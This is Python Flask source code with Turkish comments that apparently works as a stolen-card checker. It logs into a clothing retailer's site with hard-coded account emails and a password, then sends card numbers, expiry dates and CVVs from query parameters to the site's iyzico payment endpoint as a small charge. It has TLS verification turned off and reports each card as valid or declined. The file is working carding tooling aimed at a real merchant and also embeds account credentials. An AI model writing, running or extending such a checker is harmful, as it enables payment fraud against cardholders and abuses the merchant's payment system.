from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import re
import json

app = Flask(__name__)

# GERÇEK TEST KARTLARI
TEST_CARDS = {
    "visa": [
        {"number": "4155650100416111", "cvv": "123", "holder": "John Doe"},
        {"number": "4546711234567894", "cvv": "123", "holder": "John Doe"},
        {"number": "4111111111111111", "cvv": "123", "holder": "John Doe"}
    ],
    "mastercard": [
        {"number": "5406671000000005", "cvv": "123", "holder": "John Doe"},
        {"number": "5431111111111111", "cvv": "123", "holder": "John Doe"},
        {"number": "5504720000000006", "cvv": "123", "holder": "John Doe"}
    ]
}

# 5 HESAP - 6 haneli kodlarla
ACCOUNTS = {
    "000110": {"email": "mustafakemal@gmail.com", "password": "babapro31"},
    "052052": {"email": "oylesineisde@gmail.com", "password": "babapro31"},
    "345608": {"email": "gelemedinisde@gmail.com", "password": "babapro31"},
    "450789": {"email": "randomsovus@gmail.com", "password": "babapro31"},
    "111890": {"email": "oylerandom@gmail.com", "password": "babapro31"}
}

session = requests.Session()
requests.packages.urllib3.disable_warnings()

def format_json_response(data):
    """JSON çıktısını okunabilir formatta döndür"""
    return json.dumps(data, ensure_ascii=False, indent=4)

def login_to_site(email, password):
    """Siteye login ol"""
    try:
        login_get_url = "https://cmrerkekgiyim.com/uyegirisi"
        headers_get = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*"
        }

        res_get = session.get(login_get_url, headers=headers_get, verify=False)
        php_sess = session.cookies.get("PHPSESSID", "")

        login_post_url = "https://cmrerkekgiyim.com/uyeislem.php?islem=girisyap"
        login_headers = {
            "User-Agent": headers_get["User-Agent"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://cmrerkekgiyim.com",
            "Referer": login_get_url,
            "Cookie": f"PHPSESSID={php_sess}"
        }

        login_data = {"eposta": email, "sifre": password}
        res_post = session.post(login_post_url, headers=login_headers, data=login_data, verify=False)

        return "Giriş Başarılı" in res_post.text

    except Exception as e:
        print(f"Login hatası: {e}")
        return False

def get_user_profile():
    """Kullanıcı profil bilgilerini al"""
    try:
        profil_url = "https://cmrerkekgiyim.com/profilim"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

        res_profil = session.get(profil_url, headers=headers, verify=False)
        soup = BeautifulSoup(res_profil.text, "html.parser")

        isim_input = soup.find("input", {"id": "profile-first-name"})
        isim = isim_input.get("value", "") if isim_input else "John Doe"

        return isim
    except Exception as e:
        print(f"Profil alma hatası: {e}")
        return "John Doe"

# ANA ENDPOINT
@app.route("/hesap4/<hesapcode>/iyzico")
def iyzico_with_account(hesapcode):
    try:
        # Hesap kontrolü
        if hesapcode not in ACCOUNTS:
            response_data = {
                "status": "error",
                "message": "❌ Geçersiz hesap kodu",
                "available_codes": list(ACCOUNTS.keys())
            }
            return format_json_response(response_data), 400

        account = ACCOUNTS[hesapcode]
        
        # Parametreleri al
        cc = request.args.get("cc", "").strip()
        ay = request.args.get("ay", "").strip()
        yil = request.args.get("yil", "").strip()
        cvv = request.args.get("cvv", "").strip()
        identity = request.args.get("identityNumber", "").strip()

        # Gerekli parametre kontrolü
        if not all([cc, ay, yil, cvv]):
            response_data = {
                "status": "error",
                "message": "Eksik parametre: cc, ay, yil, cvv gerekli",
                "account": account["email"]
            }
            return format_json_response(response_data), 400

        # Siteye login ol
        if not login_to_site(account["email"], account["password"]):
            response_data = {
                "status": "error",
                "message": "Siteye giriş başarısız",
                "account": account["email"]
            }
            return format_json_response(response_data), 403

        # Kullanıcı bilgilerini al
        isim = get_user_profile()

        # İyzico isteği
        iyzico_url = "https://cmrerkekgiyim.com/iyzicoparapuan.php"
        iyzico_data = {
            "toplamtutar": "1",
            "aciklama": "Test ödemesi",
            "CardHolderName": isim,
            "CardNumber": cc,
            "Expire": f"{ay}/{yil}",
            "x_card_code": cvv,
            "identityNumber": identity or "11111111111",
            "taksit": "1"
        }

        iyz_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://cmrerkekgiyim.com",
            "Referer": "https://cmrerkekgiyim.com/profilim"
        }

        iyz_res = session.post(iyzico_url, headers=iyz_headers, data=iyzico_data, verify=False)

        # Response analizi
        response_text = iyz_res.text.lower()

        # Başarılı durumlar
        success_indicators = [
            "3-d secure", "ödeme başarılı", "işlem başarılı",
            "redirecting", "bank page", "secure3d"
        ]

        if any(indicator in response_text for indicator in success_indicators):
            response_data = {
                "status": "success",
                "message": "✅ Kart geçerli - 3D Secure yönlendirmesi bekleniyor",
                "card": f"{cc[:6]}******{cc[-4:]}",
                "brand": "VISA" if cc.startswith('4') else "MASTERCARD",
                "account": account["email"]
            }
            return format_json_response(response_data)

        # Hata durumları
        error_patterns = {
            "geçersiz kart": "Geçersiz kart numarası",
            "invalid card": "Geçersiz kart",
            "süresi dolmuş": "Kart süresi dolmuş",
            "expired": "Kart süresi dolmuş",
            "güvenlik kodu": "Geçersiz CVV",
            "cvv": "Geçersiz CVV",
            "güvenlik denetim": "Güvenlik denetimi başarısız"
        }

        for pattern, message in error_patterns.items():
            if pattern in response_text:
                response_data = {
                    "status": "declined",
                    "message": f"❌ {message}",
                    "card": cc,
                    "details": "Bankadan red yanıtı alındı",
                    "account": account["email"]
                }
                return format_json_response(response_data)

        # HTML hata mesajı ara
        soup = BeautifulSoup(iyz_res.text, "html.parser")
        error_div = soup.find("div", {"class": "alert alert-danger"})

        if error_div:
            error_text = error_div.get_text(strip=True)
            response_data = {
                "status": "declined",
                "message": "❌ İşlem reddedildi",
                "card": cc,
                "details": error_text,
                "account": account["email"]
            }
            return format_json_response(response_data)
        else:
            # Belirsiz durum
            response_data = {
                "status": "unknown",
                "message": "⚠️ İşlem durumu belirsiz",
                "card": cc,
                "details": "Bankadan net yanıt alınamadı",
                "response_sample": response_text[:200] + "...",
                "account": account["email"]
            }
            return format_json_response(response_data)

    except Exception as e:
        response_data = {
            "status": "error",
            "message": f"🔥 Sistem hatası: {str(e)}",
            "card": cc if 'cc' in locals() else "Unknown",
            "account": account["email"]
        }
        return format_json_response(response_data), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
